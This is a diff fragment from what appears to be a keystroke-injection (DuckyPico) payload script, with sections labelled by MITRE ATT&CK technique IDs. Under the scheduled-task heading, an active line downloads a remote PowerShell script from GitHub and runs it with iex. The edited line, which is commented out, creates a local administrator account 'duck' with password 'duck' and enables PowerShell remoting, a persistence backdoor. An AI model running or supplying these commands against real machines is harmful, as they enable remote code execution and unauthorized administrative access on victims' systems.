@@ -24,7 +24,7 @@
 ##T1053 Scheduled Task/Job
 !!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/schedtsk.ps1 | iex
 ##T1136 Create Account
-##New-LocalUser -Name "Username" -Password (ConvertTo-SecureString "Password" -AsPlainText -Force) -FullName "Full Name"; Add-LocalGroupMember -Group "Administrators" -Member "Username"; Enable-PSRemoting -Force
+##New-LocalUser -Name "duck" -Password (ConvertTo-SecureString "duck" -AsPlainText -Force) -FullName "Full Name"; Add-LocalGroupMember -Group "Administrators" -Member "duck"; Enable-PSRemoting -Force
 ##
 ##Lateral Movement----------------------------------------------------------------------------
 ##T1534 Internal Spearphishing
